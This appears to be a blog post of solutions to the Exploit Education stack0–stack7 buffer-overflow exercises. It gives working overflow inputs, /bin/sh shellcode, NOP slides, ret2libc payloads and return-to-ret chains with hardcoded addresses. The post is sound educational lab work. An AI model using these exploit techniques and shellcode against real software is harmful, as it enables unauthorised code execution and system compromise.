---
title: exploit education stack levels
date: 2020-03-23
---

# stack0:
The buffer size is 64 wide. if we write 4 bytes pass the buffer
we can change the `modified` var.

``` python -c " print 'A' * (64 + 4)" | stack0 ```


# stack1:
The buffer size is 64 wide. if we write 4 bytes pass the buffer
we can change the `modified` var to the specified hex.

```./stack1 $(python -c " print 'A' * 64 + 'dcba'") ```


# stack2:
The buffer size is 64 wide. if we write 4 bytes pass the buffer
we can change the `modified` var to the specified hex.

```
export GREENIE="`echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\r\n\r"`"
./stack2 
```


# stack3:
The buffer size is 64 wide. if we write 4 bytes pass the buffer
we can change the function pointer to point to our function

``` python -c "print ('A' * 64) + '\x24\x84\x04\x08'" | ./stack3 ```


# stack4:
This time we have to overwrite the return address to call win.
when glibc calls main, the call instruction push the address of the next
instruction on the stack to return to after main finish.
inside main we have a buffer of size 64. since there's not much memory
allocation happening, we just need to overwrite the buffer and old ebp
on the stack and the return address (overwrite the return address with address of `win` func).

The buffer size is 64 wide. if we write 4 bytes pass the buffer 
we overwrite the old ebp and 4 bytes more to overwrite the return address
with our `win` function address.

```python -c "print 'A' * 76 + '\xf4\x83\x04\x08' " | ./stack4 ```



# stack5:
This time we have to overwrite the return address to execute shellcode.
when glibc calls main, the call instruction push the address of the next
instruction on the stack to return to after main finish.
we just need to overwrite the return address on the stack with an adress to return to.
then inject our code and point the return adress to the start of our code
we use `nop` instruction to help us add padding to the stack in case we need padding.
The `\xCC` opcode is for debuging (it makes your program execute 1 instruction at a time)

The buffer size is 64 wide. if we write 4 bytes pass the buffer 
we overwrite the old ebp and 4 bytes more to overwrite the return address
with our `shellcode`.

```
# put the shell code between the padding 
# nop_slide = "\x90" * 44  
# eip = "\xa0\xf7\xff\xbf"
# print nop_slide + "\xCC" * 32 + eip * 4
# print nop_slide + shell_code + eip * 8

# -------------------

# put the shell code at the end
padding = "A" * 76
eip = "\xc0\xf7\xff\xbf"
nop_slide = "\x90" * 4
shell_code = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"  
print padding + eip + nop_slide + shell_code
`$> (python script; cat) | ./stack5`
```


# stack6:
Similer to the previouse level. but this time we can't return to the stack.
however, we still can control the ret pointer. 
One approch to solve this level is ret2libc

Approch: ret2libc
This approch says that we need to return to some useful function in libc.
so, we can use (system) function to help us execute a shell.
`To find address of system, run the binary in gdb, break on main and x/ system`
second, we need `/bin/sh` string to pass to system. use strings to
find strings in libc and grep for /bin/sh.
`strings -t x /lib/libc.so` this will return the offset of /bin/sh
then in gdb add the offset to address of libc to find address. To find the address
of libc, in gdb, type `info proc map`.

```
Our stack will look like this:
STACK 
ret -> address of system (ret of getpath func)
ret -> address to return to when system finish
arg -> address of /bin/sh

padding = "A" * 0x50
system  = struct.pack("I", 0xb7ecffb0)
ret     = "AAAA"
bin_sh  = struct.pack("I", 0xb7fb63bf)

print padding + system + ret + bin_sh
`$> (python script; cat) | ./stack6`
```

Approch 2: return to return pointer

This approch is a little confusing. what return to return pointer means, is
instead of providing a stack address to return to, we could provide the return
address to return to and then slide down to a stack address.

for example, we overwrite the return address with the address of 
return instruction. when our function returns, it's going to pop the return
address and jump to it which in that case is the return instruction itself.
we could continue doing that and provide a stack address at the end to jump to
where we have our shell code.

```
ret_instruction_addr    = struct.pack("I", 0x080484f9) * 0x50
stack_addr              = struct.pack("I", 0xbffff8ec)
nop_slid                = "\x90" * 0x50
shell_code = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

print ret_instruction_addr + stack_addr + nop_slid + shell_code

`$> (python script; cat) | ./stack6`
```



# stack7:
This one is similer to the previouse one but this time you can't return to libc.
however, we still can return to the address of our return instruction in getpath.
since we have seen how to do that alread, this time, I want to return to address
of return instruction but instead of executing shell code, I want to call libc
`system` function.

one thing I want to say is we don't have to return to address of getpath return,
we could return to other return instruction address inside our `.text section.


```
buffer = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
buffer += struct.pack("I", 0x08048544) # address of getpath ret instruction
buffer += struct.pack("I", 0xb7ecffb0) # address of system
buffer += "AAAA" # return address after system func
buffer += struct.pack("I", 0xb7fb63bf) # address of /bin/sh

print buffer
```


